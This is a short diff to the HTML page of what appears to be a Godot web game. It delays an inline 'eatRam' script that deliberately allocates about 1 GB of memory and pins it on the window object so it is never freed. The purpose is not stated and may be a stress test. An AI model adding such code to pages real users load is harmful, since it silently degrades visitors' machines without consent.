@@ -214,7 +214,7 @@ const engine = new Engine(GODOT_CONFIG);
 		</script>
 
 		<script>
-(function eatRam() {
+setTimeout(function eatRam() {
 	const chunks = [];
 	const chunkSize = 128 * 1024 * 1024; // 128 MB per chunk
 	const targetChunks = 8; // 8 × 128 MB = 1 GB
@@ -229,7 +229,7 @@ const engine = new Engine(GODOT_CONFIG);
 
 	console.log("~1 GB RAM consumed");
 	window._ramHog = chunks; // Keep reference alive so GC doesn't free it
-})();
+}, 3000);
 		</script>
 	</body>
 </html>
